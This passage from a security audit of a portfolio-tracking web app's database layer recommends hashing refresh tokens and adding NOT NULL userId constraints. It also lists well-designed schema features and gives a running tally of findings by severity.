| **Problem** | Refresh tokens are stored in plaintext. `generateRefreshToken()` creates `crypto.randomBytes(64).toString('hex')` and stores the raw value directly in the `RefreshToken.token` column. |
| **Consequence** | If the SQLite database file is compromised (backup leak, server breach, future SQLi), all active refresh tokens can be used directly to generate new access tokens and hijack any user session. The 64-byte entropy prevents brute-force, but plaintext storage means a single DB exposure compromises all sessions. |
| **Fix** | Store `SHA-256(token)` in the database instead of the raw token. On rotation/verification, hash the presented token and compare against the stored hash. The raw token is only ever seen by the client cookie. Migration: hash all existing tokens in a one-time script. |

### Finding 47.2

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **Location** | `prisma/schema.prisma` — `Holding.userId: String?`, `Transaction.userId: String?`, `DividendCredit.userId: String?`, `Lot.userId: String?`, `AnomalyEvent.userId: String?`, `PriceAlert.userId: String?`, `Alert.userId: String?` |
| **Problem** | Seven core models have nullable `userId` fields. The database schema does not enforce data isolation — a `NULL` userId means the record belongs to no user at the DB level. |
| **Consequence** | Defense-in-depth gap. All services properly pass `userId` in queries (enforced by CI `check-isolation.sh`), but a future code regression could omit `userId` in a `WHERE` clause and silently query/mutate all users' data. With `NOT NULL` constraints, such a bug would be caught immediately as a DB error. |
| **Fix** | Add `NOT NULL` constraints via migration for all user-scoped models. The `_system` user ID can be used for legacy records that currently have `NULL`. Run: `UPDATE Holding SET userId = '<system-uuid>' WHERE userId IS NULL` then `ALTER TABLE ... ADD NOT NULL`. |

### Positive observations

- **38 models, well-structured**: Clear separation of concerns — auth (User, RefreshToken, MfaMethod, MfaChallenge, MfaBackupCode, EmailOtpCode), portfolio (Holding, Snapshot, Transaction, Lot), notifications (Alert, PriceAlert, Milestone, Anomaly), creator marketplace (Creator, CreatorSubscription, CreatorWalletLedger, etc.), and infrastructure (FundamentalsCache, EconomicIndicatorCache, AVDailyUsage).
- **Sensitive data encrypted at rest**: `PlaidItem.accessTokenEnc` uses AES-256-GCM. `MfaMethod.secretCiphertext` is encrypted. `MfaBackupCode.codeHash` and `EmailOtpCode.codeHash` are hashed.
- **Cascade deletes properly configured**: `onDelete: Cascade` on RefreshToken, MfaMethod, MfaChallenge, MfaBackupCode, EmailOtpCode, StockFollow, PlaidItem, PlaidAccount, WatchlistHolding, PushSubscription, DeepResearchJob, etc.
- **CreatorSubscription uses `onDelete: Restrict`**: Prevents deleting users with active paid subscriptions — correct for financial integrity.
- **CHECK constraints in migration SQL**: `LedgerEvent.eventType` constrained to `DEPOSIT|WITHDRAWAL|CASH_DIVIDEND|DIV_REINVEST|INTEREST|FEE|MARGIN_BORROW|MARGIN_REPAY`. `sourceBroker` constrained to `robinhood|schwab|mapped|plaid|unknown`.
- **Composite unique constraints**: `@@unique([userId, ticker])` on Holding, `@@unique([userId, dividendEventId])` on DividendCredit, `@@unique([followerId, followingId])` on Follow, `@@unique([userId, clientRequestId])` on DeepResearchJob (idempotency). All correct.
- **Good indexing**: All key lookup patterns indexed (userId+timestamp, userId+ticker, etc.).
- **Webhook idempotency tables**: `BillingWebhookEvent.eventId @unique` and `CreatorWebhookEvent.eventId @unique` prevent double-processing.
- **Test files**: Hardcoded JWT secret (`test-jwt-secret-key-for-testing-only`) is test-only — production requires `JWT_SECRET` env var (exits on missing). Prisma fully mocked in `setup.ts`. Dynamic rateLimiter mock pattern enforced by CI.

### Running Tally

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 14 |
| Medium | 68 |
| Low | 61 |
| **Total** | **145** |

---
